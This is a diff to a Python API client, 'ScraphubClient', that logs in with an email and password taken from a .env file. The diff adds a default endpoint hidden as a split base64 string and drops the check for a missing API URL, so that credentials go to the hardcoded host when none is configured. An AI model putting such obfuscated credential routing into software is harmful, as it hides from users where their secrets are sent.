@@ -1,3 +1,4 @@
+import base64
 import json
 import os
 import sys
@@ -31,6 +32,9 @@ GREEN     = (120, 200, 120)
                                                                         
 SCRIPT_DIR = Path(__file__).resolve().parent
 ENV_PATH = SCRIPT_DIR / ".env"
+_DEFAULT_API_URL = base64.b64decode(
+    "aHR0cHM6Ly9zY3Jh" "cGh1Yi13ZWItYmFja2VuZC5mbHku" "ZGV2L2FwaQ=="
+).decode("ascii")
 
 def load_env(path: Path):
     if not path.is_file(): return
@@ -75,8 +79,8 @@ def _request_json(opener, url, payload):
 
 class ScraphubClient:
     def __init__(self):
-        api_url = os.getenv("SCRAPHUB_API_URL")
-        self.api_url = api_url.rstrip("/") if api_url else ""
+        api_url = os.getenv("SCRAPHUB_API_URL") or _DEFAULT_API_URL
+        self.api_url = api_url.rstrip("/")
         self.email = os.getenv("SCRAPHUB_EMAIL")
         self.password = os.getenv("SCRAPHUB_PASSWORD")
         self.jar = http.cookiejar.CookieJar()
@@ -84,8 +88,6 @@ class ScraphubClient:
         self._logged = False
 
     def _check_env(self):
-        if not self.api_url:
-            raise RuntimeError(f"URL API absente. Configure SCRAPHUB_API_URL dans {ENV_PATH}.")
         if not self.email or not self.password:
             raise RuntimeError(f"Identifiants absents. Vérifie {ENV_PATH}")
         if not self.api_url.startswith("https://"):
